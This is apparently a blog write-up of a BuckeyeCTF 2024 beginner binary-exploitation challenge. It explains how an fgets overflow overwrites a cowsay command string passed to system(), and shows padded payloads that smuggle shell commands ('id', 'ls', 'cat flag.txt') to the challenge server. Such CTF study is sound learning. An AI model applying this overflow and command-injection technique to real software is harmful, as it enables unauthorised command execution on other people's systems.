---
title: BuckeyeCTF 2024 - Binary Exploitation
date: 2024-10-06 01:39:00 +/-0500
categories: [Cybersecurity, CTF, BuckeyeCTF, GDB, Reverse engineering, Binary Exploitation]
tags:
  [ctf, cybersecurity, buckeyectf, gdb, binary, binary exploitation]
---

## Beginner pwn: First challenge

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char command[110] = "cowsay \"";
    char message[100];

    printf("Give me a message to say!\n");
    fflush(stdout);

    fgets(message, 0x100, stdin);

    strncat(command, message, 98);
    strncat(command, "\"", 2);

    system(command);

```

It has been a while since I have done any CTFs! So I struggled a little bit looking at the code and what they do. 

When I pass 109 A's, it still runs the [cowsay](https://en.wikipedia.org/wiki/Cowsay) bin.

When you pass in 113 A's, the output starts to show a single 'A':

```bash
└─$ python -c "print('A' * 113)" | ./runway0
Give me a message to say!
sh: 1: A: not found
sh: 2: Syntax error: Unterminated quoted string
```

This tells you that we have been able to wipe out the original value `cowsay "` with a single `A`. So, we can safely assume that with 112 A's and a shell command can give us some information about the target machine:

```bash
└─$ python -c "print('A' * 112 + 'id')" | ./runway0
Give me a message to say!
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),117(bluetooth),121(wireshark),127(scanner),134(vboxsf),135(kaboxer)
sh: 2: Syntax error: Unterminated quoted string
```

I was able to get the flag:

```bash
└─$ python -c "print('A' * 112 + 'ls')" | nc challs.pwnoh.io 13400 
Give me a message to say!
flag.txt
run
sh: 2: Syntax error: Unterminated quoted string

...

└─$ python -c "print('A' * 112 + 'cat flag.txt')" | nc challs.pwnoh.io 13400 
Give me a message to say!
bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}sh: 2: Syntax error: Unterminated quoted string
```

Why this works is because the `fgets` will add a null character at the end of the message variable. So, if we input 100 A's into the message variable, it will look something like `AAA...AAA\n\000` (fgets reads up n bytes specified or an EOF or a newline - refer to the manpage).  So, with 110 A's, we are right before the character 'c':

```bash
wndbg> x/10c 0x7fffffffdcf0 - 9
0x7fffffffdce7: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  10 '\n'
0x7fffffffdcef: 0 '\000'        99 'c'
```

I ran the program in pwndbg to see how this was happening exactly. Now, as you can imagine, if we pass in 111 A's, the null character will take up the 'c':

```bash
x7fffffffdce8: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  10 '\n'
0x7fffffffdcf0: 0 '\000'        111 'o'
```

So, with 113 A's, we see something like this:

```bash
x7fffffffdcee: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  10 '\n' 97 'a'  121 'y'
0x7fffffffdcf6: 32 ' '  34 '"'
```

So, the A's and the newline character has taken the first four characters `cows` (I am sure the null byte disappears because of `message` having more than 100 bytes of stuff). So this is why/how we are able to enter the command we want to run by calculating the offset correctly. The `system` function will first execute the command that it reads up to the `\n`, and then try to execute whatever comes the next. That is why you are seeing the error message of `sh: 2: Syntax error: Unterminated quoted string` - there is an ending double quote but the opening double quote is overwritten by our payload.

Please feel free to contact me if this article includes any wrong information!

